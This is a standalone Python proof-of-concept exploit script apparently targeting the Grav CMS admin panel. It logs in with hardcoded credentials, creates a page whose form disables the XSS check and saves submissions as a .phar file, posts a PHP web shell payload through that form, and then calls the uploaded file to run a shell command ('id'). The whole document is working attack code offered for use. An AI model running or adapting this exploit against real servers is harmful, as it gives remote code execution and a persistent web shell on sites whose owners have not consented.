# PoC.py
import requests
from bs4 import BeautifulSoup

class Poc:

    def __init__(self, cmd):
        self.sess = requests.Session()

        ##########    INIT    ################
        self.USERNAME = "guest"
        self.PASSWORD = "Guest123!"
        self.PREFIX_URL = "http://192.168.12.119:8888/grav"
        self.PAGE_NAME = "this_is_poc_page47"
        self.PHP_FILE_NAME = "universe.phar"
        self.PAYLOAD = '<?php system($_GET["cmd"]); ?>'
        self.cmd = cmd
        ##########    END    ################

        self.sess.get(self.PREFIX_URL)
        self._login()
        self._save_page()
        self._inject_command()
        self._execute_command()
    

    def _get_nonce(self, data, name):
        # Get login nonce value
        res = BeautifulSoup(data, "html.parser")
        return res.find("input", {"name" : name}).get("value")

    
    def _login(self):
        print("[*] Try to Login")
        res = self.sess.get(self.PREFIX_URL + "/admin")

        login_nonce = self._get_nonce(res.text, "login-nonce")

        # Login
        login_data = {
            "data[username]" : self.USERNAME,
            "data[password]" : self.PASSWORD,
            "task" : "login",
            "login-nonce" : login_nonce
        }
        res = self.sess.post(self.PREFIX_URL + "/admin", data=login_data)

        # Check login
        if res.status_code != 303:
            print("[!] username or password is wrong")
            exit()
        
        print("[*] Success Login")


    def _save_page(self):
        print("[*] Try to write page")

        res = self.sess.get(self.PREFIX_URL + f"/admin/pages/{self.PAGE_NAME}/:add")
        form_nonce = self._get_nonce(res.text, "form-nonce")
        unique_form_id = self._get_nonce(res.text, "__unique_form_id__")

        # Add page data
        page_data  = f"task=save&data%5Bheader%5D%5Btitle%5D={self.PAGE_NAME}&data%5Bcontent%5D=content&data%5Bheader%5D%5Bsearch%5D=&data%5Bfolder%5D={self.PAGE_NAME}&data%5Broute%5D=&data%5Bname%5D=form&data%5Bheader%5D%5Bbody_classes%5D=&data%5Bordering%5D=1&data%5Border%5D=&data%5Bheader%5D%5Border_by%5D=&data%5Bheader%5D%5Border_manual%5D=&data%5Bblueprint%5D=&data%5Blang%5D=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}&toggleable_data%5Bheader%5D%5Bpublished%5D=0&toggleable_data%5Bheader%5D%5Bdate%5D=0&toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bmetadata%5D=0&toggleable_data%5Bheader%5D%5Bdateformat%5D=0&toggleable_data%5Bheader%5D%5Bmenu%5D=0&toggleable_data%5Bheader%5D%5Bslug%5D=0&toggleable_data%5Bheader%5D%5Bredirect%5D=0&toggleable_data%5Bheader%5D%5Bprocess%5D=0&toggleable_data%5Bheader%5D%5Btwig_first%5D=0&toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&toggleable_data%5Bheader%5D%5Bchild_type%5D=0&toggleable_data%5Bheader%5D%5Broutable%5D=0&toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&toggleable_data%5Bheader%5D%5Bvisible%5D=0&toggleable_data%5Bheader%5D%5Bdebugger%5D=0&toggleable_data%5Bheader%5D%5Btemplate%5D=0&toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&toggleable_data%5Bheader%5D%5Bredirect_default_route%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0"
        page_data += f"&data%5B_json%5D%5Bheader%5D%5Bform%5D=%7B%22xss_check%22%3Afalse%2C%22name%22%3A%22contact-form%22%2C%22fields%22%3A%7B%22name%22%3A%7B%22label%22%3A%22Name%22%2C%22placeholder%22%3A%22Enter+php+code%22%2C%22autofocus%22%3A%22on%22%2C%22autocomplete%22%3A%22on%22%2C%22type%22%3A%22text%22%2C%22validate%22%3A%7B%22required%22%3Atrue%7D%7D%7D%2C%22process%22%3A%7B%22save%22%3A%7B%22filename%22%3A%22{self.PHP_FILE_NAME}%22%2C%22operation%22%3A%22add%22%7D%7D%2C%22buttons%22%3A%7B%22submit%22%3A%7B%22type%22%3A%22submit%22%2C%22value%22%3A%22Submit%22%7D%7D%7D"
        res = self.sess.post(self.PREFIX_URL + f"/admin/pages/{self.PAGE_NAME}/:add" , data = page_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})

        print("[*] Success write page: " + self.PREFIX_URL + f"/{self.PAGE_NAME}")


    def _inject_command(self):
        print("[*] Try to inject php code")

        res = self.sess.get(self.PREFIX_URL + f"/{self.PAGE_NAME}")
        form_nonce = self._get_nonce(res.text, "form-nonce")
        unique_form_id = self._get_nonce(res.text, "__unique_form_id__")

        form_data = f"data%5Bname%5D={self.PAYLOAD}&__form-name__=contact-form&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}"

        res = self.sess.post(self.PREFIX_URL + f"/{self.PAGE_NAME}" , data = form_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})

        print("[*] Success inject php code")


    def _execute_command(self):
        res = self.sess.get(self.PREFIX_URL + f"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}")

        if res.status_code == 404:
            print("[!] Fail to execute command or not save php file.")
            exit()

        print("[*] This is uploaded php file url.")
        print(self.PREFIX_URL + f"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}")
        print(res.text)


if __name__ == "__main__":
    Poc(cmd="id")